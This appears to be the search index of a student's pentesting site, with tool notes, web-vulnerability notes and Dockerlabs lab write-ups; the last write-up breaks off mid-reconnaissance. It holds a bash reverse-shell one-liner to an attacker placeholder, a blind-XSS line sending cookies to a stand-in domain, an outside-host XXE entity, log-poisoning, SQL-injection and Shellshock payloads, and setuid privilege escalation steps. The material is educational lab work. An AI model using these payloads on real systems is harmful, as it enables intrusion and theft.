{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome / Bienvenido","text":"<p>Hi! I'm Isa\u00edas, a Computer Engineering student, Junior Pentester, and cybersecurity enthusiast. Welcome to my personal website where you can find my writeups, notes, and projects.</p>"},{"location":"#select-your-language-selecciona-tu-idioma","title":"Select your language / Selecciona tu idioma","text":"<p>English | Espa\u00f1ol</p>"},{"location":"en/","title":"Welcome to Isa\u00edas' Personal Website","text":"<p>Hello! I'm Isa\u00edas, a Computer Engineering student majoring in Information Technologies and Cybersecurity. Here you'll find my writeups, notes, projects, and more.</p>"},{"location":"en/#disclaimer","title":"\u26a0\ufe0f Disclaimer","text":"<p>This content is educational and should not be used for malicious purposes. All exercises were performed in controlled environments.</p>"},{"location":"en/#writeups","title":"Writeups","text":"<p>In this section, you'll find my machine WriteUps, covering topics such as Environment Setup, Reconnaissance, Exploitation, Privilege Escalation, and Lessons Learned.</p> <ul> <li>Dockerlabs<ul> <li>First Hacking </li> <li>Injection </li> <li>Trust </li> <li>Obsession</li> </ul> </li> </ul>"},{"location":"en/#notes","title":"Notes","text":"<p>In this section, you'll find my notes on topics such as cybersecurity vulnerabilities, pentesting tool tutorials, and more.</p> <ul> <li>Most Common Web Vulnerabilities</li> <li>Pentesting Tools</li> </ul>"},{"location":"en/#projects","title":"Projects","text":"<p>Here you'll find the projects I\u2019ve completed and the ones I\u2019m currently working on (most of them are available on GitHub).</p>"},{"location":"en/#links","title":"Links","text":"<ul> <li>My GitHub</li> <li>My Cybersecurity Repository</li> </ul>"},{"location":"en/notes/Tools/","title":"Pentesting Tools","text":""},{"location":"en/notes/Tools/#0-how-to-obtain-a-reverse-shell","title":"0. How to Obtain a Reverse Shell","text":"<p>First, run the following command on your terminal to get a raw tty:</p> <pre><code>nc -nlvp {attacker port}\n</code></pre> <p>This command will listen on the specified port, waiting for the target machine to send a reverse shell.</p> <ul> <li>Windows<ol> <li>Download netcat</li> <li>Execute:</li> </ol> </li> </ul> <pre><code>./nc.exe {attacker ip} {nc -nlvp {attacker port} -l cmd.exe\n</code></pre> <ul> <li>Linux<ol> <li>Execute:</li> </ol> </li> </ul> <pre><code>bash -i &gt;&amp; /dev/tcp/{attacker ip}/{attacker port} 0&gt;&amp;1  \n</code></pre> <p>Once you have the reverse shell, to make it fully interactive, run:</p> <pre><code>script /dev/null -c bash\nstty raw -echo; fg\nreset xterm\nexport TERM=xterm\n</code></pre> <p>Now you can interact with a fully functional tty.</p>"},{"location":"en/notes/Tools/#1-arp-scan","title":"1. arp-scan","text":"<p>The arp-scan is used to scan the network (usually local) to discover the target machine's IP. Common command:</p> <pre><code>arp-scan -I {iface} --localnet\n</code></pre> <ul> <li>iface is the network interface to scan.</li> </ul>"},{"location":"en/notes/Tools/#2-nmap","title":"2. nmap","text":"<p>nmap is a versatile tool for port scanning. Some of the most useful scans:</p>"},{"location":"en/notes/Tools/#21-port-enumeration","title":"2.1. Port Enumeration","text":"<p>First scan to list open ports (you can use extractPorts to copy them easily):</p> <pre><code>nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn {@IP victim} -oG allPorts\n</code></pre> <p>Parameters explained:</p> <ol> <li>-p- \u2192 scan all ports</li> <li>--open \u2192 show only open ports</li> <li>sS \u2192 stealth SYN scan (which is stealthy because it doesn't do the 3-way handshake)</li> <li>--min-rate 5000\u2192 send at least 5000 packets/sec</li> <li>-vvv \u2192 verbose output</li> <li>-n \u2192 skip DNS resolution for more velocity</li> <li>-Pn \u2192 skip host discovery with ping</li> <li>-oG allPorts\u2192 save output in greppable format in the file that we specifie (on this case allPorts)</li> </ol> <p>Use extractPorts to filter relevant ports:</p> <pre><code>extractPorts allPorts\n</code></pre>"},{"location":"en/notes/Tools/#22-detailed-port-scan","title":"2.2. Detailed Port Scan","text":"<p>After obtaining the list of ports, perform a more thorough scan:</p> <pre><code>nmap -sCV -p{copied ports} {@victym ip} -oN targeted\n</code></pre> <p>Parameters:</p> <ol> <li>-sCV \u2192 the sC parameter executes all the nmap scripts scan, and the V parameters shows also the version of the service that is running.</li> <li>-p \u2192 specify ports</li> <li>-oN targeted \u2192 save in normal format for easy reading (on this case to targeted)</li> </ol> <p>You now have two files: allPorts (greppable) and targeted (full scan output), that you can simply check whenever you want.</p> <pre><code>cat -l ruby targeted\n</code></pre> <p>Those scans are the basics, in the future we may need to list closed or filter ports...</p>"},{"location":"en/notes/Tools/#3-searchsploits","title":"3. Searchsploits","text":"<p>Useful for finding known vulnerabilities in services:</p> <pre><code>searchsploits {version &amp; service}\n</code></pre> <p>Always complement with online searches (GitHub, Exploit-DB).</p>"},{"location":"en/notes/Tools/#4-msfvenom","title":"4. Msfvenom","text":"<p>This tool is used to generate custom payloads for a wide variety of operating systems and architectures. To do this, the first thing to do is list the payloads and filter them using grep with keywords. The command to list payloads is as follows:</p> <pre><code>msfvenom -l\n</code></pre> <p>Once we have found the payload that interests us, to save it on our machine we must execute the following command</p> <pre><code>msfvenom -p {payload} LHOST={@attacker ip} LPORT={listener port} -f {filetype} -o {filename.extension}\n</code></pre>"},{"location":"en/notes/Tools/#5-nessus","title":"5. Nessus","text":"<p>Another tool for scanning and reporting vulnerabilities is Nessus. Nessus is a service that runs on port 8834 on our computer (localhost) with the HTTPS service. To use it, you must first start the service using</p> <pre><code>systemctl start nessusd.service\n</code></pre> <p>Once it's running, we need to access https://localhost:8834 using a web browser. Once inside Nessus, to start a new scan, press the \"New Scan\" button in the upper right corner. This will redirect you to a page with a wide selection of possible scans. The most commonly used ones are:</p> <ul> <li>Advanced Scan \u2192 It is a slow scan, but it reports potential vulnerabilities.</li> <li>Host Discovery \u2192 very basic scan (not that useful)</li> </ul>"},{"location":"en/notes/Tools/#6-burpsuite","title":"6. Burpsuite","text":"<p>Burpsuite is an interception proxy that acts as an intermediary between a website and the attacker, allowing you to manually manage requests and responses. You can access it from the rofi, from the terminal with the \"burpsuite\" command, or with the shortcut \"Super + shift + b\" (on my Kali Linux at least).</p>"},{"location":"en/notes/Tools/#7-gobuster","title":"7. Gobuster","text":"<p>Gobuster is a tool that allows you to enumerate directories on a website using a dictionary. This attack is called fuzzing, and it's primarily useful for gathering information. The most commonly used command is the following:</p> <pre><code>gobuster dir -w {dictionary} -u {URL} -t {number of threads} -x {extensions}\n</code></pre> <ul> <li>Dictionary \u2192 Dictionary to be used for fuzzing. The most common are:<ul> <li>/usr/share/wordlists/dirb/common.txt</li> <li>/usr/share/wordlsists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt</li> </ul> </li> <li>URL \u2192 The URL on which the attack will be carried out. For example, http://{victim IP}</li> <li>Number of threads \u2192 Number of threads used in the attack (to make it faster). For example, 20</li> <li>Extensions \u2192 The extensions directories can have (html, php, txt, php.bak). For this, it's best to use the SecLists dictionary.</li> </ul>"},{"location":"en/notes/Tools/#8-hash-identifier-john-the-ripper","title":"8. Hash-identifier + John The Ripper","text":"<p>These two tools are often used together. The first, hash-identifier, is used to identify the type of hash used to encrypt a string, and John The Ripper is used to decrypt it (to use it, you must pass the hash type as a parameter). The commands are as follows:</p> <pre><code>hash-identifier\njohn --format=Raw-{Tipo hash} --wordlist={dictionary} {file with the hash}\n</code></pre> <p>The dictionary par excellence is \"/usr/share/wordlists/rockyout.txt\".</p>"},{"location":"en/notes/Tools/#9-hydra","title":"9. Hydra","text":"<p>Hydra is a tool for executing brute-force attacks. For this attack, you need to know the service you're attempting to attack (FTP, SSH, HTTP, etc.), and it's recommended to know one of the two credentials (either username or password), since if you don't know either and execute the brute-force attack with two dictionaries, it can take a long time. Below are the three most common FTP scenarios (to change the service, simply change ftp to the desired service (SSH, HTTP, etc.).</p> <pre><code>hydra -l {user} -P {dictionary} ftp://{victym ip}\nhydra -L {dictionary} -p {password} ftp://{victym ip}\nhydra -L {dictionary} -P {dictionary} ftp://{victym ip} (don't do that, expends a lot of time)\n</code></pre>"},{"location":"en/notes/Tools/#10-wfuzz","title":"10. Wfuzz","text":"<p>Tool used to list a website's subdomains. The command used is as follows:</p> <pre><code>wfuzz -c --nc 400 -t 200 -w &lt;dictionary&gt; -v &lt;domain&gt; -H \"HOST: FUZZ.&lt;domain&gt;\"\n</code></pre> <p>Thus, the wfuzz command searches for subdomains by changing the word FUZZ to the subdomains in the dictionary.</p>"},{"location":"en/notes/Tools/#11-base64","title":"11. Base64","text":"<p>This is very useful and comes up a lot (it's used a lot). To decode base64 strings, run the following command:</p> <pre><code>echo \"base64_string\" | base64 --decode\n</code></pre> <p>To encode in base64, execute the following:</p> <pre><code>echo \"text\" | base64\n</code></pre>"},{"location":"en/notes/Tools/#12-whatweb","title":"12. WhatWeb","text":"<p>An open-source tool designed to identify technologies used on websites. WhatWeb can detect content management systems (CMS), blogging platforms, statistical analysis packages, JavaScript libraries, web servers, and embedded devices. It can also identify version numbers, email addresses, account IDs, web framework modules, SQL errors, and more. The command used is as follows:</p> <pre><code>whatweb http://example.com\n</code></pre>"},{"location":"en/notes/VulnerabilityWeb/","title":"Notes on the Most Common Web Vulnerabilities","text":""},{"location":"en/notes/VulnerabilityWeb/#1-local-file-inclusion-lfi","title":"1. Local File Inclusion (LFI)","text":"<p>Allows an attacker to include local server files, typically via vulnerable parameters: - https://localhost/myweb.php?idioma=es \u2192 https://localhost/myweb.php?idioma=/etc/passwd Evasion and tricks:</p> <ul> <li>If it only allows <code>.txt</code>, try null byte injection:</li> <li><code>https://localhost/myweb.php?language=/etc/passwd%00.txt</code></li> <li><code>%00</code> terminates the string before <code>.txt</code> is appended internally (old PHP trick, may still work on legacy environments).</li> <li>If restricted to a specific path (<code>/var/www/html/lang/</code>) \u2192 Path Traversal:</li> <li><code>https://localhost/myweb.php?language=../../../../../../etc/passwd</code> (Try also encoded <code>.</code> (<code>%2e</code>) or combinations like <code>%2e%2e/</code> to bypass filters)</li> </ul>"},{"location":"en/notes/VulnerabilityWeb/#2-wrappers","title":"2. Wrappers","text":"<p>PHP has \"wrappers\" like <code>php://input</code> or <code>data://</code> that allow accessing streams as if they were files:</p> <ul> <li><code>php://input</code> \u2192 Access the request body (POST)</li> <li><code>data://</code> \u2192 Execute embedded data as a file</li> <li><code>file://</code> \u2192 Access local files</li> <li><code>zip://</code>, <code>phar://</code>, <code>glob://</code>, etc.</li> </ul> <p>You can send your own PHP code in the POST body and it will execute.</p>"},{"location":"en/notes/VulnerabilityWeb/#3-log-poisoning","title":"3. Log Poisoning","text":"<p>With LFI, you can enumerate log files (mostly in <code>/var/log</code>). If you find access logs, you can execute commands by injecting PHP code in accesses, which will run when the log is included.</p> <pre><code>curl -s -H \"User-Agent: &lt;?php system('whoami'); ?&gt;\" \"http://localhost/myweb.php?file=/var/log/apache2/access.log\"\n</code></pre>"},{"location":"en/notes/VulnerabilityWeb/#4-remote-file-inclusion-rfi","title":"4. Remote File Inclusion (RFI)","text":"<p>Similar to LFI but allows including remote files, like malicious scripts. Be careful, it only works if <code>allow_url_include</code> is enabled.</p>"},{"location":"en/notes/VulnerabilityWeb/#5-html-injection","title":"5. HTML Injection","text":"<p>Inject HTML (not JavaScript) into a page. Does not execute JS but can be used for phishing or DOM manipulation.</p> <pre><code>&lt;b&gt;\u00a1Hola admin!&lt;/b&gt;&lt;form action=\"...\"&gt;\n</code></pre> <p>It may also allow <code>&lt;img src=\"javascript:...\"&gt;</code> or a trap <code>&lt;form&gt;</code>.</p>"},{"location":"en/notes/VulnerabilityWeb/#6-cross-site-scripting-xss","title":"6. Cross-Site Scripting (XSS)","text":"<p>JavaScript injection in web pages. Allows you to: - Steal cookies - Hijack sessions - Modify the DOM - Redirect the user Classic example: <code>&lt;script&gt;alert('XSS');&lt;/script&gt;</code></p>"},{"location":"en/notes/VulnerabilityWeb/#7-blind-xss","title":"7. Blind XSS","text":"<p>Similar to XSS, but the payload executes elsewhere (e.g., admin panel). Example: inject: <code>&lt;script&gt;fetch('https://tuyo.com?c='+document.cookie)&lt;/script&gt;</code> You won\u2019t see anything, but when the admin opens the page, you can steal cookies.</p>"},{"location":"en/notes/VulnerabilityWeb/#8-cross-site-request-forgery-csrf","title":"8. Cross-Site Request Forgery (CSRF)","text":"<p>Trick a logged-in user into performing actions unknowingly (change password, transfers). Example: <code>&lt;img src=\"http://victima.com/change_password?new=1234\" /&gt;</code> \u2192 If the session is active, the password changes without consent. Solution: use CSRF tokens and verify methods (GET/POST).</p>"},{"location":"en/notes/VulnerabilityWeb/#9-server-side-request-forgery-ssrf","title":"9. Server-Side Request Forgery (SSRF)","text":"<p>Use the server as a proxy to make internal requests (access <code>127.0.0.1</code>, cloud metadata, etc.). Useful to scan internal networks or access restricted services (internal admin panels, cloud metadata).</p>"},{"location":"en/notes/VulnerabilityWeb/#10-sql-injection-error-based","title":"10. SQL Injection / Error-Based","text":"<p>SQL injection that reveals useful errors for exploitation:</p> <pre><code>' OR 1=1 --\n</code></pre> <p>If errors are displayed, you can exfiltrate data easily:</p> <pre><code>' UNION SELECT null, version(), database() --\n</code></pre>"},{"location":"en/notes/VulnerabilityWeb/#11-sql-injection-time-based-blind","title":"11. SQL Injection / Time-Based (Blind)","text":"<p>No visible errors, but you can infer responses using functions like <code>SLEEP()</code>:</p> <pre><code>' OR IF(1=1, SLEEP(5), 0) --\n</code></pre> <p>If it delays 5 seconds, the injection worked (blind SQLi discovered).</p>"},{"location":"en/notes/VulnerabilityWeb/#12-padding-oracle-attack-padbuster","title":"12. Padding Oracle Attack (Padbuster)","text":"<p>Attack against block ciphers (like CBC) using errors to deduce padding and decrypt info. If an encrypted cookie produces different errors depending on padding, it can be decrypted byte by byte. Classic tool: padbuster.pl.</p>"},{"location":"en/notes/VulnerabilityWeb/#13-padding-oracle-attack-bit-flipper-burpsuite","title":"13. Padding Oracle Attack (Bit Flipper / BurpSuite)","text":"<p>Same idea as Padding Oracle, but instead of decrypting, you modify content \u2192 flip bits in ciphertext to force a specific result (like privilege escalation). Example: change <code>user=normal</code> \u2192 <code>user=admin</code> by flipping bits until the decrypted data grants elevated privileges.</p>"},{"location":"en/notes/VulnerabilityWeb/#14-shellshock","title":"14. ShellShock","text":"<p>Bash vulnerability allowing command execution via environment variables. Affects old CGI servers:</p> <pre><code>User-Agent: () { :; }; /bin/bash -c 'id'\n</code></pre>"},{"location":"en/notes/VulnerabilityWeb/#15-xml-external-entity-injection-xxe","title":"15. XML External Entity Injection (XXE)","text":"<p>Attack XML parsers that allow defining external entities, letting you read files or perform SSRF. Dangerous for SOAP/XML APIs:</p> <pre><code>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt; ]&gt;\n&lt;root&gt;&amp;xxe;&lt;/root&gt;\n</code></pre>"},{"location":"en/notes/VulnerabilityWeb/#16-blind-xxe","title":"16. Blind XXE","text":"<p>Like XXE, but you don\u2019t see the response. Use a side channel, such as forcing DNS requests:</p> <pre><code>&lt;!ENTITY % ext SYSTEM \"http://tuo.dominio.com/pwn\"&gt;\n</code></pre>"},{"location":"en/notes/VulnerabilityWeb/#17-domain-zone-transfer-axfr","title":"17. Domain Zone Transfer (AXFR)","text":"<p>Obtain the full DNS zone of a domain if the DNS server is misconfigured:</p> <pre><code>dig axfr @dns.victima.com victima.com\n</code></pre>"},{"location":"en/notes/VulnerabilityWeb/#18-deserialization-attacks","title":"18. Deserialization Attacks","text":"<p>Send serialized data (PHP, Java, Python objects) that executes code when deserialized. PHP example:</p> <pre><code>O:8:\"Exploit\":1:{s:4:\"data\";s:13:\"&lt;?php info(); ?&gt;\";}\n</code></pre>"},{"location":"en/notes/VulnerabilityWeb/#19-type-juggling","title":"19. Type Juggling","text":"<p>Exploit how PHP (or other languages) compare different types (strings vs ints):</p> <pre><code>if ($_POST['auth'] == \"0e12345\") // vulnerable\n</code></pre> <p>Authentication bypass.</p>"},{"location":"en/notes/VulnerabilityWeb/#20-virtual-hosting","title":"20. Virtual Hosting","text":"<p>Multiple web subdomains can run on the same port. To enumerate them, you can use tools like wfuzz</p>"},{"location":"en/writeups/FirstHacking/","title":"Write Up First Hacking","text":"<p>Difficulty: Super easy Link to dockerlabs: https://dockerlabs.es/</p>"},{"location":"en/writeups/FirstHacking/#setting-the-enviroment","title":"Setting the enviroment","text":"<p>First of all we deploy the machine with the script that comes when downloading the machine</p> <pre><code>\u276f chmod +x auto_deploy.sh\n\u276f sudo ./auto_deploy.sh firsthacking.tar\n\nEstamos desplegando la m\u00e1quina vulnerable, espere un momento.\n\nM\u00e1quina desplegada, su direcci\u00f3n IP es -\u2192 172.17.0.2\n\nPresiona Ctrl+C cuando termines con la m\u00e1quina para eliminarla\n</code></pre> <p>Once deployed, we create the firsthacking folder, go inside and use the mkt utility that creates the nmap, content, exploits and scripts folders.</p> <pre><code>\u276f mkdir firsthacking-dockerlabs\n\u276f cd firsthacking-dockerlabs\n\u276f mkt\n\u276f ls -l\ndrwxrwxr-x godack godack 4.0 KB Thu Aug 14 19:20:29 2025 content\ndrwxrwxr-x godack godack 4.0 KB Thu Aug 14 19:20:29 2025 exploits\ndrwxrwxr-x godack godack 4.0 KB Thu Aug 14 19:20:29 2025 nmap\ndrwxrwxr-x godack godack 4.0 KB Thu Aug 14 19:20:29 2025 scripts\n</code></pre>"},{"location":"en/writeups/FirstHacking/#recon","title":"Recon","text":"<p>The first thing we do is a general reconnaissance with nmap on the victim machine, to obtain the open ports.</p> <pre><code>\u276f nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts\n\nPORT   STATE SERVICE REASON\n21/tcp open  ftp     syn-ack ttl 64\n</code></pre> <p>Once we have the open ports, we perform a more thorough scan using reconnaissance scripts to obtain the services on each port and the version they are running.</p> <pre><code>\u276f extractPorts allPorts\n[*] Extracting information...\n\n     [*] IP Address: 172.17.0.2\n     [*] Open ports: 21\n\n[*] Ports copied to clipboard\n\n\u276f nmap -sCV -p21 172.17.0.2 -oN targeted\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-14 19:17 CEST\nNmap scan report for 172.17.0.2\nHost is up (0.00018s latency).\n\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 2.3.4\nMAC Address: 02:42:AC:11:00:02 (Unknown)\nService Info: OS: Unix\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 2.71 seconds\n</code></pre> <p>In this way we discover that the service running on port 21 (FTP port) is vsftpd version 2.3.4.</p>"},{"location":"en/writeups/FirstHacking/#exploit","title":"Exploit","text":"<p>Once we have recognized the ports and services, we realize that when searching with searchsploit, the vsftpd service with version 2.3.4 is a vulnerable service.</p> <pre><code>\u276f searchsploit vsftpd 2.3.4\n-------------------------------------------------------- ---------------------------------\n Exploit Title                                          |  Path\n-------------------------------------------------------- ---------------------------------\nvsftpd 2.3.4 - Backdoor Command Execution               | unix/remote/49757.py\nvsftpd 2.3.4 - Backdoor Command Execution (Metasploit)  | unix/remote/17491.rb\n-------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n</code></pre> <p>In this way, we searched on GitHub for exploits for this vulnerability, and we found this repository, we downloaded it and executed it (https://github.com/Hellsender01/vsftpd_2.3.4_Exploit).</p> <pre><code>\u276f git clone https://github.com/Hellsender01/vsftpd_2.3.4_Exploit.git\n\u276f sudo python3 -m pip install pwntools\n\u276f python3 exploit.py 172.17.0.2\n[+] Got Shell!!!\n[+] Opening connection to 172.17.0.2 on port 21: Done\n[*] Closed connection to 172.17.0.2 port 21\n[+] Opening connection to 172.17.0.2 on port 6200: Done\n[*] Switching to interactive mode\n$ whoami\nroot\n$  \n</code></pre> <p>And finally we have access to the machine and we don't have to scale privileges because we are already root user!!</p>"},{"location":"en/writeups/FirstHacking/#lessons-learned","title":"Lessons Learned","text":"<ol> <li>Scans with nmap</li> <li>Use of searchsploit</li> <li>Searching for exploits on GitHub</li> </ol>"},{"location":"en/writeups/Injection/","title":"Write Up Injection","text":"<p>Difficulty: Super easy Link to dockerlabs: https://dockerlabs.es/</p>"},{"location":"en/writeups/Injection/#setting-the-enviroment","title":"Setting the enviroment","text":"<p>First of all we deploy the machine with the script that comes when downloading the machine</p> <pre><code>\u276f chmod +x auto_deploy.sh\n\u276f sudo ./auto_deploy.sh injection.tar\n\nEstamos desplegando la m\u00e1quina vulnerable, espere un momento.\n\nM\u00e1quina desplegada, su direcci\u00f3n IP es -\u2192 172.17.0.2\n\nPresiona Ctrl+C cuando termines con la m\u00e1quina para eliminarla\n</code></pre> <p>Once deployed, we create the injection folder, go inside and use the mkt utility that creates the nmap, content, exploits and scripts folders.</p> <pre><code>\u276f mkdir injection-dockerlabs\n\u276f cd injection-dockerlabs\n\u276f mkt\n\u276f ls -l\ndrwxrwxr-x godack godack 4.0 KB Fri Aug 15 17:03:20 2025 content\ndrwxrwxr-x godack godack 4.0 KB Fri Aug 15 17:03:20 2025 exploits\ndrwxrwxr-x godack godack 4.0 KB Fri Aug 15 17:03:20 2025 nmap\ndrwxrwxr-x godack godack 4.0 KB Fri Aug 15 17:03:20 2025 scripts\n</code></pre>"},{"location":"en/writeups/Injection/#recon","title":"Recon","text":"<p>The first thing that we do is a general reconnaissance with nmap over the victym machine, with the purpose to obtain the open ports.</p> <pre><code>\u276f nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts\n\nPORT   STATE SERVICE REASON\n22/tcp open  ssh     syn-ack ttl 64\n80/tcp open  http    syn-ack ttl 64\n</code></pre> <p>Once we have obtained the open ports we can do an exhaustive scan with recon scripts with the purpose to obtain the services that are running on each port and their's version.</p> <pre><code>\u276f extractPorts allPorts\n[*] Extracting information...\n\n   [*] IP Address: 172.17.0.2\n   [*] Open ports: 22,80\n\n[*] Ports copied to clipboard\n\n\u276f nmap -sCV -p22,80 172.17.0.2 -oN targeted\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-15 17:09 CEST\nNmap scan report for 172.17.0.2\nHost is up (0.000051s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 72:1f:e1:92:70:3f:21:a2:0a:c6:a6:0e:b8:a2:aa:d5 (ECDSA)\n|_  256 8f:3a:cd:fc:03:26:ad:49:4a:6c:a1:89:39:f9:7c:22 (ED25519)\n80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))\n| http-cookie-flags: \n|   /: \n|     PHPSESSID: \n|_      httponly flag not set\n|_http-title: Iniciar Sesi\\xC3\\xB3n\n|_http-server-header: Apache/2.4.52 (Ubuntu)\nMAC Address: 02:42:AC:11:00:02 (Unknown)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 7.31 seconds\n</code></pre> <p>In this way we discovered that the service running on port 22 (FTP port) is OpenSSH 8.9p1 and on port 80 (http port) an Apache httpd 2.4.52 web service is running.</p>"},{"location":"en/writeups/Injection/#exploit","title":"Exploit","text":"<p>As we have seen that there is a web service running on the victim machine, we proceed to view the web, adding the domain (in this case it does not have one and we will simply put the name of the machine) to the /etc/hosts file of our virtual machine (it is the local DNS configuration file).</p> <pre><code>\u276f sudo vi /etc/hosts\n\u276f cat /etc/hosts\n127.0.0.1   localhost\n127.0.1.1   kali\n\n172.17.0.2  injection\n\n# The following lines are desirable for IPv6 capable hosts\n::1     localhost ip6-localhost ip6-loopback\nff02::1 ip6-allnodes\nff02::2 ip6-allrouters\n</code></pre> <p>Once the /etc/hosts file is configured, we proceed to access the website, and we see that it is a login form.</p> <p></p> <p>Let's try entering the basic parameters to check for SQL injection. To do this, enter the string admin' OR '1' = '1'; -- in the username section and anything else for password (in my case, I put hacked!) to allow the form to be submitted. If everything goes well, you'll be able to log in as the administrator (if it doesn't work with the admin user, you can change it to root, administrator, and similar, but without wasting too much time).</p> <pre><code>User: admin' OR '1' = '1'; --\nPassword: hacked!\n</code></pre> <p>And bingo! We're in and we get Dylan's credentials.</p> <pre><code>Bienvenido Dylan! Has insertado correctamente tu contrase\u00f1a: KJSDFG789FGSDF78\n</code></pre> <p>Having obtained these credentials, we can try to access through the also open ssh port.</p> <pre><code>ssh dylan@injection\ndylan@injection's password: (aqu\u00ed ponemos el password)\ndylan@6b329dffcb35:~$ \n</code></pre> <p>And we alredy get access to the machine!</p>"},{"location":"en/writeups/Injection/#privilege-escalation","title":"Privilege escalation","text":"<p>To be able to use the console in a more comfortable way we can do the following treatment of the terminal:</p> <pre><code>script /dev/null -c bash\nstty raw -echo; fg\nreset xterm\nexport TERM=xterm\n</code></pre> <p>Now that we have a terminal we look for files (preferably binary) with the root user and the setuid flag active and we find the following:</p> <pre><code>dylan@6b329dffcb35:/bin$ find / -perm -4000 -user root 2&gt;/dev/null\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/bin/passwd\n/usr/bin/mount\n/usr/bin/gpasswd\n/usr/bin/umount\n/usr/bin/chfn\n/usr/bin/newgrp\n/usr/bin/su\n/usr/bin/env\n/usr/bin/chsh\n</code></pre> <p>So we use the env command as follows and elevate privileges to root</p> <pre><code>dylan@6b329dffcb35:/bin$ ./env /bin/sh -p\n# whoami\nroot\n# \n</code></pre>"},{"location":"en/writeups/Injection/#lessons-learned","title":"Lessons Learned","text":"<ol> <li>Scans with nmap</li> <li>Simple SQL injection</li> <li>Searching for binaries with active setuid</li> <li>Privilege escalation with env</li> </ol>"},{"location":"en/writeups/Obsession/","title":"Write Up Obsession","text":"<p>Difficulty: Super easy Link to dockerlabs: https://dockerlabs.es/</p>"},{"location":"en/writeups/Obsession/#setting-up-the-environment","title":"Setting up the environment","text":"<p>First of all, we deploy the machine using the script that comes when downloading it:</p> <pre><code>\u276f chmod +x auto_deploy.sh\n\u276f sudo ./auto_deploy.sh obsession.tar\n[sudo] contrase\u00f1a para godack: \n\n                       ##        .         \n                 ## ## ##       ==         \n              ## ## ## ##      ===         \n          /\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\\___/ ===       \n     ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~\n          \\______ o          __/           \n            \\    \\        __/            \n             \\____\\______/               \n\n  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ \n  |  \\ |  | |    |_/  |___ |__/ |    |__| |__] [__  \n  |__/ |__| |___ | \\_ |___ |  \\ |___ |  | |__] ___] \n\n\n\nEstamos desplegando la m\u00e1quina vulnerable, espere un momento.\n\nM\u00e1quina desplegada, su direcci\u00f3n IP es -\u2192 172.17.0.2\n\nPresiona Ctrl+C cuando termines con la m\u00e1quina para eliminarla\n</code></pre> <p>Once deployed, we create the folder <code>obsession-dockerlabs</code>, move inside, and use the mkt utility, which creates the folders nmap, content, exploits and scripts.</p> <pre><code>\u276f mkdir obsession-dockerlabs\n\u276f cd obsession-dockerlabs\n\u276f mkt\n\u276f ls -l\ndrwxrwxr-x godack godack 4.0 KB Tue Aug 19 10:06:44 2025 content\ndrwxrwxr-x godack godack 4.0 KB Tue Aug 19 10:06:44 2025 exploits\ndrwxrwxr-x godack godack 4.0 KB Tue Aug 19 10:06:44 2025 nmap\ndrwxrwxr-x godack godack 4.0 KB Tue Aug 19 10:06:44 2025 scripts\n</code></pre>"},{"location":"en/writeups/Obsession/#reconnaissance","title":"Reconnaissance","text":"<p>As usual, we start with a quick and stealthy scan on the victim\u2019s IP to discover open ports. Then, we run a more thorough scan only on those ports (which makes it faster than scanning all 65k).</p> <pre><code>\u276f nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts\nHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-19 10:11 CEST\nInitiating ARP Ping Scan at 10:11\nScanning 172.17.0.2 [1 port]\nCompleted ARP Ping Scan at 10:11, 0.07s elapsed (1 total hosts)\nInitiating SYN Stealth Scan at 10:11\nScanning 172.17.0.2 [65535 ports]\nDiscovered open port 21/tcp on 172.17.0.2\nDiscovered open port 22/tcp on 172.17.0.2\nDiscovered open port 80/tcp on 172.17.0.2\nCompleted SYN Stealth Scan at 10:11, 1.02s elapsed (65535 total ports)\nNmap scan report for 172.17.0.2\nHost is up, received arp-response (0.0000090s latency).\nScanned at 2025-08-19 10:11:18 CEST for 1s\nNot shown: 65532 closed tcp ports (reset)\nPORT   STATE SERVICE REASON\n21/tcp open  ftp     syn-ack ttl 64\n22/tcp open  ssh     syn-ack ttl 64\n80/tcp open  http    syn-ack ttl 64\n</code></pre> <p>Now we use the extractPorts utility to copy the ports to clipboard and perform a detailed scan:</p> <pre><code>\u276f extractPorts 